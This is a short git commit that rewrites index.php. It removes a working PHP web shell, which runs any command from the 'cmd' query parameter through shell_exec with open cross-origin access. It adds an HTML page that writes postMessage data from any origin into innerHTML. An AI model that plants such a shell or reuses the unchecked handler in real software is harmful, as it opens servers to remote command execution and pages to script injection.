0663d1e55c98ca0a04a6fdd45d2a66af46116ff1
Rikikangsc2 <112865967+Rikikangsc2@users.noreply.github.com>
2023-04-07 11:17:01 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,15 +1,27 @@
-<?php
-
-// Set header untuk mengizinkan akses dari berbagai domain
-header("Access-Control-Allow-Origin: *");
-
-// Ambil perintah yang dikirim melalui method GET
-$command = $_GET["cmd"];
-
-// Jalankan perintah
-$output = shell_exec($command);
-
-// Tampilkan output terminal Bash
-echo "<pre>$output</pre>";
-
-?>
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Contoh Kode</title>
+	<style>
+		/* Stylesheet */
+	</style>
+</head>
+<body>
+	<h1>Contoh Kode</h1>
+	<p>RAM Storage:</p>
+	<div id="ram-storage"></div>
+	<p>Logs:</p>
+	<div id="logs"></div>
+	<script>
+		// JavaScript
+		// Menerima informasi dari kode lain
+		window.addEventListener("message", function(event) {
+			if (event.data.type === "ram-storage") {
+				document.getElementById("ram-storage").innerHTML = event.data.value;
+			} else if (event.data.type === "logs") {
+				document.getElementById("logs").innerHTML = event.data.value;
+			}
+		});
+	</script>
+</body>
+</html>
